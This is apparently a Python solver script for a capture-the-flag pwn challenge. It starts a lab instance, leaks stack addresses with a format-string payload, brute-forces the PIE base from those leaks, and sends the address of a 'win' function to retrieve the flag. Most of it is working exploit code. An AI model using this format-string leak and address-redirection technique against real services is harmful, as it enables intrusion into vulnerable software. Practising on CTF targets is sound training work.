import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

WIN_OFF = 0x1376
cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/491/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/491/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)


def session():
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(6)
    time.sleep(0.4)
    try:
        s.recv(4096)
    except Exception:
        pass
    return s


fmt = ".".join(f"%{i}$p" for i in range(1, 21))
s = session()
s.sendall((fmt + "\n").encode())
time.sleep(0.8)
out = b""
try:
    while True:
        c = s.recv(8192)
        if not c:
            break
        out += c
        if b"0x12345" in out:
            break
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("leak:", txt[:300])
cands = [int(m.group(0), 16) for m in re.finditer(r"0x[0-9a-f]{8,12}", txt)]
cands = [c for c in cands if 0x500000000000 <= c <= 0x7fffffffffff]
print("candidats:", [hex(c) for c in cands[:6]])
s.close()
# tenter chaque candidat comme adresse de retour dans main (main+0xXX)
tried = set()
for c in cands:
    for off in (0x1418 + 0x9c, 0x1418 + 0xa3, 0x14b4, 0x1489, 0x1418):
        base = c - off
        if base & 0xfff != 0 or base in tried:
            continue
        tried.add(base)
        win = base + WIN_OFF
        s2 = session()
        s2.sendall((fmt + "\n").encode())
        time.sleep(0.6)
        try:
            s2.recv(8192)
        except Exception:
            pass
        s2.sendall((hex(win) + "\n").encode())
        time.sleep(0.7)
        r = b""
        try:
            r = s2.recv(8192)
        except Exception:
            pass
        rt = r.decode("utf-8", "replace")
        s2.close()
        fl = re.search(r"(?:academy|picoCTF)\{[^}]*\}", rt)
        print(f"  base={hex(base)} win={hex(win)} -> {rt[:120].replace(chr(10),' ')}")
        if fl:
            print("FLAG:", fl.group(0))
            sys.exit(0)
